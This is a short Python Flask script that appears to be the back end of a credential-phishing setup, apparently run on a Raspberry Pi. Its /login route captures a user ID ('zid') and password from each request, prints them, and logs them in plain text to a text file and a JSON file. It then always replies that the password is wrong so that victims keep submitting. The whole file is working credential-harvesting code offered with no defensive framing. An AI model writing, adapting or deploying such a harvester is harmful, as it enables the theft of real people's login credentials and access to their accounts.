import json
import time

from flask import Flask, request

app = Flask(__name__)
 
 
@app.route("/login", methods=["GET", "POST"])
def login():
    zid = request.args.get("id")
    password = request.args.get("password")
    print("zid = ", zid)
    print("password = ", password)
    #write to txt file
    f = open("/home/pi/data.txt","a")
    f.write(f"\nLogin time: {time.asctime(time.localtime(time.time()))} \n Zid : {zid} \n password: {password} \n ----------------------------- \n")
    f.close()

    #write to json file
    try:
        fp = open("/home/pi/data.json","r")
        data = json.load(fp)
        fp.close()
        users = data['users']
        users.append({"zid":zid,"password":password})
        data["num_user"] = int(data["num_user"]) + 1
    except:
        data = {"num_user":1,"users":[{"zid":zid,"password":password}]}
    fp = open("/home/pi/data.json","w")
    json.dump(data,fp)
    fp.close()

    #Always shows password error
    return "zid does not match password"
 
def run_server():
     app.run(host="192.168.0.1", port=8080)

if __name__ == "__main__":
    run_server()

